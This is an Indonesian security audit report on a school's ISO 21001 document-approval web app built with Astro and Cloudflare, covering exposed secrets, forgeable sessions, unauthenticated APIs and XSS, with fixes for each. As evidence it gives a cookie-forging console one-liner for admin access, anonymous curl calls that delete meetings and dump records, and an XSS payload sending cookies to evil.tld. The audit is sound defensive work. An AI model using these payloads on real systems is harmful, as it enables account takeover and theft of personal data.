Langkah Deploy yang Diperlukan

Perubahan kode sudah selesai, tetapi aplikasi baru benar-benar aman setelah Anda menjalankan langkah-langkah berikut.

# 1. Rotasi secret Azure di Portal, lalu setel kedua secret di Cloudflare Pages
npx wrangler pages secret put MS_CLIENT_SECRET
npx wrangler pages secret put SESSION_SECRET   # nilai ada di .dev.vars

# 2. Build bersih dan deploy
npm run build:cloudflare
npx wrangler pages deploy dist
Temuan tak terduga saat perbaikan. Folder dist/ ternyata berisi sisa build lama: ditemukan tiga berkas manifest berbeda, salah satunya dibuat di mesin Linux (/var/www/html/iso-digital/astro-app/) dan masih menyertakan rute /api/seed. Karena Cloudflare mengunggah seluruh isi dist/, artefak usang itu ikut ter-deploy. Astro tidak mengosongkan direktori output secara andal, sehingga skrip clean kini ditambahkan dan dijalankan otomatis sebelum setiap build.

Selain itu, skrip build:cloudflare sebelumnya menggunakan sintaks DEPLOY_TARGET=cloudflare astro build yang gagal total di Windows karena npm menjalankan skrip lewat cmd.exe. Skrip itu dipindah ke berkas konfigurasi terpisah (astro.config.cloudflare.mjs) sehingga build produksi bisa dijalankan.

Ringkasan Eksekutif

Aplikasi ini secara fungsional sudah matang — alur PR, cuti, serah terima aset, dan absensi rapat berjalan, dengan template dokumen ISO 21001:2018 yang rapi. Namun dari sisi keamanan, aplikasi ini masih berstatus prototype: tidak ada satu pun endpoint API yang melakukan autentikasi atau otorisasi, dan sesi login disimpan sebagai cookie JSON tanpa tanda tangan, sehingga peran admin dapat dipalsukan langsung dari browser.

Akibatnya, sistem persetujuan berjenjang (approval) yang menjadi inti kepatuhan ISO 21001 saat ini tidak dapat dipertanggungjawabkan secara hukum: siapa pun dapat menyetujui dokumen, menyisipkan tanda tangan palsu, atau menghapus jejak persetujuan tanpa meninggalkan audit trail.

1. Temuan Kritis

Client secret Azure/Entra ID terekspos dan ikut ter-deploy ke produksi

C-01 · Secrets Management · CVSS ~9.1
Kritis
Bukti

Berkas .env berisi secret dalam teks biasa, tidak ada .gitignore di proyek ini, dan Vite/Astro menyalin nilainya secara statis ke dalam hasil build:

// dist/_worker.js/pages/api/auth/callback.astro.mjs
let msSecret = "xQ88Q~VerjLtucW…[DISEMBUNYIKAN]…xkaZ-";

Artinya secret ini sudah terunggah ke Cloudflare Pages di dalam bundle _worker.js yang dapat diakses publik, dan akan ikut ter-commit jika proyek ini dimasukkan ke Git.

Dampak

Penyerang yang memiliki secret + client ID (keduanya ada di kode) dapat melakukan operasi atas nama aplikasi di tenant Microsoft 365 sekolah — berpotensi membaca data Graph, mengirim email, atau memperluas akses tergantung izin yang diberikan pada app registration.

Tindakan
  • Rotate secret sekarang di Azure Portal → App Registration → Certificates & secrets → buat secret baru, hapus yang lama.
  • Buat .gitignore berisi .env, .env.*, node_modules/, dist/, .wrangler/.
  • Simpan secret hanya sebagai Cloudflare Pages secret: wrangler pages secret put MS_CLIENT_SECRET.
  • Ubah kode agar tidak pernah membaca secret lewat import.meta.env (yang di-inline saat build) — cukup locals.runtime.env, dan build tanpa berkas .env.
  • Rebuild dan deploy ulang setelah rotasi.
Perbaikan
// callback.ts — jangan pernah fallback ke import.meta.env di production
const msSecret = (locals as any)?.runtime?.env?.MS_CLIENT_SECRET;
if (!msSecret) return redirect('/?auth_error=missing_ms_secret', 302);

Sesi login dapat dipalsukan — siapa pun bisa menjadi admin

C-02 · Broken Authentication · CVSS ~9.8
Kritis
Bukti

src/pages/api/auth/callback.ts menulis sesi sebagai JSON polos tanpa tanda tangan kriptografis:

cookies.set('iso_user_session', JSON.stringify(sessionPayload), {
  path: '/',
  httpOnly: false,        // ← dapat dibaca/ditulis JS
  secure: false,          // ← dikirim lewat HTTP juga
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7,
});

Tidak ada HMAC, tidak ada penyimpanan sesi di server, tidak ada pencabutan. Server mempercayai isi cookie secara mentah (JSON.parse di /api/auth/me dan di halaman /meeting/[id]).

Dampak

Satu baris di konsol browser cukup untuk mengambil alih identitas siapa pun:

document.cookie = "iso_user_session=" + encodeURIComponent(JSON.stringify({
  id: 1, displayName: "Aris Setyawan", email: "aris.setyawan@edelweiss.sch.id",
  jobTitle: "ICT Coordinator", department: "ICT", role: "admin"
})) + "; path=/";

Karena cookie tidak httpOnly, skrip jahat mana pun di halaman (termasuk XSS pada temuan H-04) juga dapat mencurinya.

Tindakan
  • Ganti ke sesi bertanda tangan/terenkripsi. Untuk Cloudflare Workers, jose (JWT) atau iron-webcrypto adalah pilihan yang ringan dan kompatibel dengan Web Crypto.
  • Set httpOnly: true, secure: true, sameSite: 'lax', dan simpan kunci di Pages secret (SESSION_SECRET).
  • Sertakan iat / exp dan verifikasi di setiap permintaan; sediakan endpoint logout yang benar-benar mencabut sesi.
  • Ambil role dari basis data berdasarkan ms_id, bukan dari klaim yang dikirim klien.
Perbaikan
// src/lib/session.ts
import { SignJWT, jwtVerify } from 'jose';
const key = () => new TextEncoder().encode(secret);

export async function sealSession(payload: SessionUser) {
  return await new SignJWT({ ...payload })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt().setExpirationTime('8h')
    .sign(key());
}
export async function openSession(token?: string) {
  if (!token) return null;
  try { const { payload } = await jwtVerify(token, key());
        return payload as SessionUser; }
  catch { return null; }
}

Seluruh API dapat diakses tanpa login (18 endpoint terbuka)

C-03 · Broken Access Control · CVSS ~8.6
Kritis
Bukti

Tidak ada satu pun dari 18 berkas di src/pages/api/ yang memeriksa cookie sesi. Polanya identik di semua endpoint:

export const DELETE: APIRoute = async ({ params, locals }) => {
  const env = locals.runtime?.env;              // cek DB saja…
  await db.delete(meetings).where(eq(meetings.id, meetingId));
  return new Response(JSON.stringify({ success: true }), { status: 200 });
};

Contoh yang dapat dieksploitasi secara anonim:

curl -X DELETE https://<domain>/api/meetings/MTG-42     # hapus rapat + daftar hadir
curl          https://<domain>/api/prs                 # semua PR + tanda tangan base64
curl          https://<domain>/api/meetings            # nama, email, TTD seluruh peserta
curl          https://<domain>/api/assets              # nilai aset & lokasi server room
Dampak

Kebocoran data pribadi massal (nama, email, jabatan, tanda tangan base64), penghancuran data oleh siapa pun, dan pemalsuan status persetujuan. Untuk aplikasi yang mengklaim kepatuhan ISO 21001:2018, ini merupakan pelanggaran langsung terhadap klausul kontrol dokumen dan rekaman.

Tindakan
  • Buat src/middleware.ts yang memverifikasi sesi untuk semua rute /api/* kecuali allowlist (/api/auth/*).
  • Tambahkan pemeriksaan otorisasi per-aksi: hanya pembuat yang boleh mengubah dokumennya; hanya pemegang peran pada langkah approval aktif yang boleh menyetujui.
  • Batasi cakupan data: endpoint daftar hanya mengembalikan dokumen milik pengguna, atau dokumen yang memang perlu ia setujui.
Perbaikan
// src/middleware.ts
export async function onRequest(ctx, next) {
  const { pathname } = new URL(ctx.request.url);
  const isApi = pathname.startsWith('/api/');
  const isPublic = pathname.startsWith('/api/auth/');

  const user = await openSession(ctx.cookies.get('iso_user_session')?.value);
  ctx.locals.user = user;

  if (isApi && !isPublic && ctx.request.method !== 'GET' && !user)
    return new Response('Unauthorized', { status: 401 });
  if (isApi && !isPublic && !user)
    return new Response('Unauthorized', { status: 401 });
  return next();
}

2. Temuan Tingkat Tinggi

Alur persetujuan dapat dipalsukan dari sisi klien

H-01 · Integrity / Spoofing
Tinggi

Pada src/pages/api/prs/[id].ts (serta leaves dan handovers), status dan tanda tangan approver dikirim oleh klien lalu disimpan apa adanya. Tidak ada verifikasi bahwa pengguna yang menekan "Setuju" memang memiliki peran pada langkah tersebut, dan tidak ada pencocokan tanda tangan dengan pemilik akun.

if (body.approvals) {
  await db.delete(prApprovals).where(eq(prApprovals.prId, prId));   // hapus jejak lama
  await db.insert(prApprovals).values(body.approvals.map(a => ({
    status: a.status, signature: a.signature,   // ← dari klien, tanpa validasi
  })));
}

Dampak: staf biasa dapat membuat PR Rp 50 juta, menandainya "Approved" di semua tingkat, lalu menyisipkan gambar tanda tangan Ketua Yayasan yang diambil dari dokumen lain. Dokumen yang dihasilkan akan tampak sah.

Tindakan: lakukan transisi status di server. Verifikasi ctx.locals.user.role cocok dengan prApprovals.role pada currentApprovalStep; ambil tanda tangan dari tabel users berdasarkan ID sesi — jangan pernah menerima signature dari badan permintaan.

Stored XSS melalui data tanda tangan (iframe tanpa sandbox)

H-02 · CWE-79 Cross-Site Scripting
Tinggi

/api/user/save-signature dan /api/meetings/[id]/attend menerima string apa pun sebagai tanda tangan — tidak ada pemeriksaan bahwa nilainya berupa data:image/png;base64,…. Nilai itu kemudian disuntikkan mentah ke dalam HTML dokumen:

// src/lib/pdfTemplates.ts
const pemohonSig = pr.requester_signature
  ? `<img src="${pr.requester_signature}" alt="TTD">` : '';

Dan HTML tersebut dirender di PdfPreviewModal.tsx menggunakan <iframe srcdoc> tanpa atribut sandbox. Iframe srcdoc mewarisi origin halaman induk, sehingga skrip di dalamnya memiliki akses penuh ke DOM dan cookie aplikasi.

// payload tanda tangan "beracun"
x" onerror="fetch('//evil.tld?c='+document.cookie)

Dampak: pencurian sesi, aksi atas nama korban, dan penyebaran otomatis ke setiap pengguna yang membuka pratinjau dokumen.

Tindakan:

  • Validasi di server: /^data:image\/(png|jpeg);base64,[A-Za-z0-9+\/=]+$/ dan batasi ukuran (mis. < 200 KB).
  • Escape semua nilai sebelum disisipkan ke HTML, atau gunakan pembuatan DOM yang aman.
  • Tambahkan sandbox pada iframe — cukup sandbox="" bila hanya menampilkan, atau aktifkan allow-scripts secara terpisah bila benar-benar diperlukan.
  • Tambahkan CSP: img-src 'self' data: blob:.
function escapeHtml(s = '') {
  return s.replace(/[&<>"']/g, c =>
    ({ '&':'&amp;', '<':'&lt;', '>':'&gt;',
       '"':'&quot;', "'":'&#39;' }[c]!));
}
const pemohonSig = isDataImage(pr.requester_signature)
  ? `<img src="${escapeHtml(pr.requester_signature)}" alt="TTD">` : '';

Endpoint /api/seed terbuka untuk umum

H-03 · Exposure of Administrative Interface
Tinggi

src/pages/api/seed.ts mengekspos operasi GET tanpa autentikasi apa pun. Untungnya seed.ts menggunakan onConflictDoNothing(), sehingga pemanggilan berulang tidak menghapus data — namun endpoint administratif tetap tidak boleh dapat dipanggil siapa pun, dan dapat dipakai untuk membebani basis data.

Tindakan: hapus endpoint ini dari build produksi, atau lindungi dengan peran admin plus secret sekali pakai. Cara terbaik: jalankan seeding lewat perintah wrangler d1 execute, bukan lewat HTTP.

Parameter OAuth state tidak pernah divalidasi

H-04 · CWE-352 Login CSRF
Tinggi

ms-login.ts membuat nilai state acak:

const state = Math.random().toString(36).substring(2, 15);

…tetapi nilai itu tidak disimpan (tidak di cookie, tidak di sesi) dan callback.ts tidak pernah membandingkannya. Selain itu Math.random() tidak aman secara kriptografis.

Dampak: login CSRF — penyerang dapat memaksa korban masuk ke akun penyerang (session fixation), yang berujung pada data korban tersimpan pada akun yang dikendalikan penyerang.

Tindakan: bangkitkan state dengan crypto.randomUUID(), simpan di cookie httpOnly yang berumur pendek, dan verifikasi kecocokannya di callback sebelum menukar kode otorisasi.

Rahasia dan data teknis dicetak ke log server

H-05 · CWE-532 Information Disclosure
Tinggi 
// src/pages/api/auth/callback.ts
console.log('DEBUG Secret:', { length: msSecret.length,
              firstChar: msSecret[0], lastChar: msSecret[msSecret.length-1] });
console.error('Failed to get access token from Microsoft:', tokenData);

Log ini tersimpan dan dapat dilihat di dashboard Cloudflare Pages (wrangler pages deployment tail), serta memberi petunjuk struktur secret kepada penyerang. Selain itu seluruh handler mengembalikan err.message mentah ke klien, yang dapat membocorkan skema basis data dan jalur berkas.

Tindakan: hapus semua console.log debug. Kembalikan pesan generik ke klien ("Terjadi kesalahan internal") dan catat detailnya hanya di log server.

Tinggi

3. Temuan Tingkat Sedang

Tidak ada audit trail yang tahan-ubah (immutable)

M-01 · ISO 21001:2018 — Rekaman & Ketertelusuran
Sedang

Setiap PUT menghapus lalu menyisipkan ulang seluruh baris approval (delete + insert). Tidak ada kolom approved_by, approved_at, atau tabel log perubahan. Akibatnya tidak mungkin membuktikan siapa menyetujui apa dan kapan.

Tindakan: tambahkan tabel audit_log (actor_id, action, entity, entity_id, before, after, ip, user_agent, created_at) yang bersifat append-only, dan ubah pembaruan menjadi operasi UPDATE alih-alih hapus-tulis-ulang.

ID rapat mudah ditebak (ruang kunci hanya 10.000)

M-02 · CWE-340 Insecure Identifier
Sedang 
id: `MTG-${Math.floor(Math.random() * 10000)}`

ID ini dipakai sebagai pengenal publik pada tautan absensi (/meeting/MTG-1234) dan kode QR. Dengan hanya 10.000 kemungkinan, seluruh rapat dapat dienumerasi; selain itu Math.random() dapat diprediksi dan berpotensi tabrakan.

Tindakan: gunakan crypto.randomUUID(), atau tambahkan token acak terpisah untuk tamu eksternal. Batasi laju permintaan (rate limit) pada endpoint absensi.

Tidak ada header keamanan dan Content-Security-Policy

M-03 · Hardening
Sedang

src/layouts/Layout.astro hanya memuat meta dasar. Tidak ada CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, maupun HSTS — sehingga tidak ada lapisan pertahanan kedua bila terjadi XSS atau clickjacking.

Tindakan: tambahkan header melalui _headers (Cloudflare Pages) atau middleware:

# public/_headers
/*
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:;
                           script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
                           font-src 'self' https://fonts.gstatic.com; frame-ancestors 'none'

Tanda tangan disimpan permanen di localStorage

M-04 · Data at Rest (klien)
Sedang

App.tsx dan /meeting/[id].astro menyimpan gambar tanda tangan ke localStorage tanpa masa kedaluwarsa. Pada komputer laboratorium atau perangkat bersama, tanda tangan pengguna berikutnya masih tersimpan. Cookie sesi 7 hari juga tidak dapat dicabut dari server.

Tindakan: jangan simpan tanda tangan di localStorage; ambil dari server setelah verifikasi sesi. Bila benar-benar perlu cache, gunakan sessionStorage dan bersihkan saat logout.

Tidak ada validasi dan batasan input di server

M-05 · CWE-20 Improper Input Validation
Sedang

Semua handler langsung memakai await request.json() tanpa pemeriksaan tipe, panjang, atau rentang — tidak ada Zod/Valibot. Contoh: body.items dapat berisi ribuan entri, body.price dapat negatif, dan body.title dapat berukuran megabita. Catatan: kueri already terparameterisasi melalui Drizzle, sehingga risiko SQL injection rendah.

Tindakan: definisikan skema Zod per endpoint dan tolak badan permintaan yang tidak sesuai sebelum menyentuh basis data.

Tidak ada pembatasan laju (rate limiting) atau perlindungan CSRF

M-06 · Availability & CSRF
Sedang

Setiap endpoint dapat dipanggil berulang tanpa batas: absensi rapat dapat dipenuhi entri palsu, dan basis data D1 dapat dikuras kuotanya. Endpoint POST juga tidak memiliki token CSRF (hanya terlindungi sebagian oleh SameSite=lax).

Tindakan: gunakan Cloudflare WAF rate-limiting rules pada /api/*; tambahkan token CSRF (double-submit) untuk permintaan yang mengubah data, atau naikkan ke SameSite=strict.

Semua pengguna login otomatis mendapat peran staff, tanpa sinkronisasi peran dari basis data

M-07 · Authorization Design
Sedang

Callback Microsoft menyetel role: 'staff' secara hardcoded dan tidak pernah mencocokkan graphUser.id dengan kolom users.msId. Akibatnya tidak ada seorang pun yang bisa menjadi approver lewat jalur login yang sah — padahal tabel users sudah berisi peran admin, coordinator, dan approver. Ini kemungkinan besar penyebab mengapa proteksi berbasis peran belum diterapkan.

Tindakan: lakukan upsert pengguna berdasarkan msId saat callback, ambil role, department, dan jobTitle dari tabel users (Entra sebagai sumber identitas, basis data sebagai sumber otorisasi), dan tolak pengguna yang belum terdaftar.

4. Temuan Tingkat Rendah

Tidak ada berkas .gitignore

L-01 · Hygiene
Rendah

Tanpa .gitignore, perintah git add . akan menyertakan .env, node_modules/ (28.138 berkas), dist/, dan .wrangler/. Ini adalah jalur paling umum terjadinya kebocoran kredensial.

Server pengembangan terbuka ke seluruh jaringan (0.0.0.0)

L-02 · Exposure
Rendah

Skrip dev dan preview menggunakan --host 0.0.0.0 (juga disetel di astro.config.mjs). Di jaringan sekolah atau Wi-Fi publik, siapa pun di subnet yang sama dapat mengakses instance lokal yang tidak terlindungi. Pertimbangkan mengubahnya ke 127.0.0.1 secara bawaan.

Tidak ada pembatasan domain email saat login Microsoft

L-03 · Access Control
Rendah

Setiap akun yang berhasil mengautentikasi di tenant akan diterima. Bila tenant mengizinkan akun tamu/personal, pihak luar dapat masuk. Tambahkan pemeriksaan bahwa email berakhiran @edelweiss.sch.id dan bahwa pengguna ada di tabel users.

Data contoh berisi informasi karyawan nyata

L-04 · Data Minimization
Rendah

src/db/seed.ts dan src/lib/dummyData.ts memuat nama lengkap, email, jabatan, dan ID Microsoft staf sungguhan. Walaupun ikut ter-bundle ke klien, data ini sebaiknya diganti dengan contoh generik atau dipindahkan ke berkas yang hanya boleh diakses server.

6. Rencana Perbaikan Berprioritas

7. Hal yang Sudah Baik

  • Tidak ada SQL injection. Semua kueri menggunakan query builder Drizzle yang terparameterisasi — tidak ada penggabungan string mentah di SQL.
  • Tidak ada innerHTML atau dangerouslySetInnerHTML di seluruh kode Solid.js, sehingga permukaan XSS di sisi klien relatif kecil.
  • Tidak ada eval() maupun new Function() di mana pun.
  • Autentikasi didelegasikan ke Microsoft Entra ID — keputusan yang tepat; tidak ada kata sandi yang disimpan atau dikelola sendiri.
  • Operasi hapus sudah menangani dependensi dengan urutan yang benar (menghapus item dan approval sebelum induknya).
  • Seeding menggunakan onConflictDoNothing(), sehingga /api/seed tidak bersifat destruktif walau terbuka.
  • Struktur basis data sudah masuk akal — pemisahan tabel approval per jenis dokumen memudahkan penerapan jejak audit nantinya.
Laporan ini disusun berdasarkan peninjauan kode sumber statis terhadap seluruh proyek D:\astro-app (3 halaman, 18 endpoint API, 17 komponen Solid.js, skema basis data, dan hasil build pada dist/). Tidak ada pengujian yang dijalankan terhadap sistem live. Temuan diurutkan berdasarkan risiko; perkiraan CVSS bersifat indikatif.
